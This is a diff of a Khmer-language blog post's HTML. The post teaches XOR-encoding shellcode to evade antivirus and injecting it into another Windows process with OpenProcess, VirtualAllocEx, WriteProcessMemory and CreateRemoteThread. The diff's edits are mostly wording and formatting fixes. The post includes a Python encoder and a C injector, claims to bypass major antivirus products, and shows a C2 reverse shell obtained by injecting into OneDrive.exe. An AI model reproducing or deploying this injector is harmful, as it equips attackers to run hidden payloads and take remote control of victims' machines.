@@ -1760,9 +1760,9 @@
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
       <h4 id="summary">Summary</h4>
-<p>នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ <a href="https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/">Process Injection</a> ដោយភ្ពាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។</p>
+<p>នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ <a href="https://th1k.github.io/en/posts/process-injection-without-write-exec-permission/">Process Injection</a> ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។</p>
 <h4 id="shellcode">Shellcode</h4>
-<p>ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។</p>
+<p>ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1772,7 +1772,7 @@
 </div>
 </div>
 <h4 id="xor-shellcode">XOR Shellcode</h4>
-<p>បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ខាងក្រោម៖</p>
+<p>បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1799,9 +1799,9 @@
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">========================Shellcode========================&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p>ក្រោយពីធ្វើកូដនីយកម្មរួចមក យើងនឹងទទួលបានកូដថ្មីមួយផ្សេងទៀត ចម្លងវាទុកដើម្បីកិច្ចការបន្ត ។</p>
+<p>ក្រោយពីធ្វើកូដនីយកម្មរួចមក យើងនឹងទទួលបានកូដថ្មីមួយផ្សេងទៀត ចម្លងវាទុកដើម្បីធ្វើកិច្ចការបន្ត ។</p>
 <h4 id="winapis">WINAPIs</h4>
-<p>ខ្លីៗអំពីការ Bypass</p>
+<p>ខ្លីៗអំពីការ Bypass ដោយប្រើ WinAIPs</p>
 <h5 id="openprocess">OpenProcess</h5>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1819,7 +1819,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><b>OpenProcess</b> ប្រើដើម្បីបើក process ដោយផ្ដល់តម្លៃតាមរយៈ PID នៃ Process របស់វា ។ ដោយសារតែគោលបំណងរបស់ Process Injection គឺជាការបង្កើតនូវចន្លោះ Allocation ថ្មីមួយសម្រាប់ Shellcode នៅក្នុង Local Process បន្ទាប់មកវានឹងធ្វើការសរសេរបញ្ចូលនូវ Shellcode នោះទៅក្នុងចន្លោះ Allocation ដែលបានបង្កើតរួចហើយទើបធ្វើការបើកដំណើរការ ។ ដូចនេះមុននឹងយើងធ្វើការបង្កើត Allocation ថ្មីមួយចូលទៅក្នុង Memory យើងត្រូវតែបង្កើត Process វាជាមុន ។</p>
+<p><b>OpenProcess</b> ប្រើដើម្បីបើក Process ដោយផ្ដល់តម្លៃតាមរយៈ PID នៃ Process របស់វា ។ ដោយសារតែគោលបំណងរបស់ Process Injection គឺជាការបង្កើតនូវចន្លោះ Allocation ថ្មីមួយសម្រាប់ Shellcode នៅក្នុង Local Process បន្ទាប់មកវានឹងធ្វើការសរសេរបញ្ចូលនូវ Shellcode នោះចូលទៅក្នុងចន្លោះ Allocation ដែលបានបង្កើតរួចហើយទើបធ្វើការបើកដំណើរការ ។ ដូចនេះមុននឹងយើងធ្វើការបង្កើត Allocation ថ្មីមួយចូលទៅក្នុង Memory យើងត្រូវតែបង្កើត Process វាជាមុន ។</p>
 <p><b>ចំណាំ៖</b> យើងត្រូវធ្វើការបិទ Opened handle តាមរយៈ CloseHandle()</p>
 <h5 id="virtualallocex">VirtualAllocEx</h5>
 <div class="highlight"><div class="chroma">
@@ -1842,7 +1842,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p>យើងប្រើ VirtualAllocEx ដើម្បីធ្វើការ Allocate ចន្លោះនៃ Memory សម្រាប់ Shellcode របស់យើងនៅក្នុង Process ផ្សេង ។ ដោយឡែកសម្រាប់ VirtualAlloc យើងអាចប្រើប្រាស់វាចំពោះតែចន្លោះនៃ Memory ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Cureent Process) ។</p>
+<p>យើងប្រើ <b>VirtualAllocEx</b> ដើម្បីធ្វើការ Allocate ចន្លោះនៃ Memory សម្រាប់ Shellcode របស់យើងនៅក្នុង Process ផ្សេង ។ ដោយឡែកសម្រាប់ VirtualAlloc យើងអាចប្រើប្រាស់វាចំពោះតែចន្លោះនៃ Memory ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។</p>
 <h5 id="writeprocessmemory">WriteProcessMemory</h5>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1864,7 +1864,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p>យើងប្រើប្រាស់ WriteProcessMemory សម្រាប់ធ្វើការសរសេរបញ្ជូលនូវ Shellcode ចូលទៅកាន់ Allocation ថ្មីមួយដែលបានមកពីការបង្កើត Process ផ្សេងតាមរយៈ VirtualAllocEx ខាងលើ។</p>
+<p>យើងប្រើប្រាស់ <b>WriteProcessMemory</b> សម្រាប់ធ្វើការសរសេរបញ្ជូលនូវ Shellcode ចូលទៅកាន់ Allocation ថ្មីមួយដែលបានមកពីការបង្កើត Process ផ្សេងតាមរយៈ VirtualAllocEx ខាងលើ។</p>
 <h5 id="virtualprotectex">VirtualProtectEx</h5>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1886,7 +1886,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p>យើងប្រើ VirtualProtectEx ដើម្បីធ្វើការកែប្រែ Protection Permission ។</p>
+<p>យើងប្រើ <b>VirtualProtectEx</b> ដើម្បីធ្វើការកែប្រែ Protection Permission ។</p>
 <h5 id="createremotethread">CreateRemoteThread</h5>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1912,9 +1912,9 @@
 </span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p>យើងប្រើ CreateRemoteThread ដើម្បីបង្កើត Thread ដែលបានដំណើរនៅក្នុងចន្លោះ Virtual Address នៃ Process ផ្សេងទៀត ។ ដោយឡែកសម្រាប់ CreateThread យើងអាចប្រើប្រាស់វាចំពោះតែការបង្កើត Thread ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Cureent Process) ។</p>
+<p>យើងប្រើ CreateRemoteThread ដើម្បីបង្កើត Thread ដែលបានដំណើរនៅក្នុងចន្លោះ Virtual Address នៃ Process ផ្សេងទៀត ។ ដោយឡែកសម្រាប់ CreateThread យើងអាចប្រើប្រាស់វាចំពោះតែការបង្កើត Thread ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។</p>
 <h5 id="pwn-the-shellcode">PWN The Shellcode</h5>
-<p>ខាងក្រោមនេះជាការបង្កើត Binary File ក្នុងការចាក់បញ្ជូល Shellcode ទៅក្នុង Process ដទៃ ហោយមានលទ្ធភាពក្នុងការ Bypass កម្មវិធីកំចាត់មេរោគមួយចំនួនផងដែរ ។</p>
+<p>ខាងក្រោមនេះជាការបង្កើត Binary File ក្នុងការចាក់បញ្ជូល Shellcode ទៅក្នុង Process ដទៃទៀត ហើយមានលទ្ធភាពក្នុងការ Bypass កម្មវិធីកំចាត់មេរោគធំៗមួយចំនួនផងដែរ ។</p>
 <p>ខាងក្រោមជាការប្រើប្រាស់ opcode ដើម្បី Decode ទៅលើ Shellcode opcode ។</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1962,8 +1962,8 @@
 </span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">remoteThread</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">remoteBuffer</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">oldPerms</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">PID</span> <span class="o">=</span> <span class="mi">16772</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Injecting to PID: %i&#34;</span><span class="p">,</span> <span class="n">PID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">PID</span> <span class="o">=</span> <span class="mi">16772</span><span class="p">;</span> <span class="c1">//Change it to target PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Injecting to PID: %i&#34;</span><span class="p">,</span> <span class="n">PID</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">processHandle</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">PID</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">remoteBuffer</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">processHandle</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -1985,8 +1985,8 @@
 </div>
 </div>
 <p><img src="/en/posts/img/2023/06/process-injection-xor-0x01/opcode-decrypt-shellcode.png" alt="Raw Code Explain" /></p>
-<p>នៅក្នុង for loop function យើងបានធ្វើការ decoded shellcode ជាមួយនិងការសរសេរបញ្ជូល opcode ចូលទៅក្នុង memory ភ្លាមៗ ។</p>
-<p>តស់ចាប់ផ្ដើម Compile និងសាកល្បងដំណើរការ ៕</p>
+<p>នៅក្នុង For Loop Function យើងបានធ្វើការ Decoded Shellcode ជាមួយនិងការសរសេរបញ្ជូល opcode ចូលទៅក្នុង Memory ភ្លាមៗ ។</p>
+<p>តស់ចាប់ផ្ដើម Compile និងសាកល្បងដំណើរការ ។</p>
 <p><img src="/en/posts/img/2023/06/process-injection-xor-0x01/process-injection.png" alt="Process Injection" /><br />
 <img src="/en/posts/img/2023/06/process-injection-xor-0x01/cbs-reverse-shell.png" alt="C2 Reverse Shell" /></p>
 <p>ការចាក់បញ្ជូលទទួលបានជោគជ័យ ដោយធ្វើការចាក់បញ្ជូលក្នុង Process របស់កម្មវិធី OneDrive.exe ដែលមានលេខ PID 408 ។</p>
